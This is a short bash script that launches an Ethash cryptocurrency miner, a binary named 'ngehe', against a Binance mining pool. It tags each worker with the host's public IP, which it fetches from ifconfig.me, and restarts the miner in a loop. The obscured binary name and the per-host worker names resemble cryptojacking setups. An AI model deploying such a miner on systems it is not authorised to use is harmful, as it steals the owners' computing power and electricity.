#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

POOL=stratum+tcp://ethash.poolbinance.com:1800
WALLET=azisrw.$(echo "$(curl -s ifconfig.me)" | tr . _ )-test

#################################
##  End of user-editable part  ##
#################################

cd "$(dirname "$0")"

chmod +x ngehe && ./ngehe --algo ETHASH --pool $POOL --user $WALLET $@
while [ $? -eq 42 ]; do
    sleep 10s
    ./ngehe --algo ETHASH --pool $POOL --user $WALLET $@
done
